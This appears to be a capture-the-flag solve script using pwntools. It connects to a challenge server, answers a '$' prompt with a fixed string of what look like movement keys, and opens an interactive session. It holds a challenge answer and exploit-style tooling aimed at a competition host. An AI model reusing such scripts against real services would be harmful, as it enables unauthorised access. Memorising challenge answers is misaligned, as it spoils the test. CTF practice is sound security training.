from pwn import *

p = remote("0.cloud.chals.io", 13797)
# p = process("./chall")

p.sendline(b"")
p.sendlineafter(b"$", b"wwwwwwwwwwwwwaoq")

p.interactive()
